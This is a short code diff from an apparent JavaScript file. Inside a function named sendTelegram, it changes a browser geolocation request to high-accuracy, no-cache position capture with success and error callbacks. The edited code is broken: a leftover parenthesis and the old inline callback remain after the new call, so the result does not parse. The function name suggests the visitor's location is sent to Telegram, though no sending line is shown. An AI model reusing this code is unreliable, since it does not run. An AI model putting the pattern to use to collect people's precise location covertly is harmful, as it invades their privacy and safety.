@@ -102,7 +102,21 @@ function sendTelegram(){
 
     if (navigator.geolocation) {
 
-        navigator.geolocation.getCurrentPosition(
+        navigator.geolocation.getCurrentPosition
+(
+
+success,
+
+error,
+
+{
+    enableHighAccuracy: true,
+    timeout: 8000,
+    maximumAge: 0
+}
+
+);
+(
 
             function(position){
 
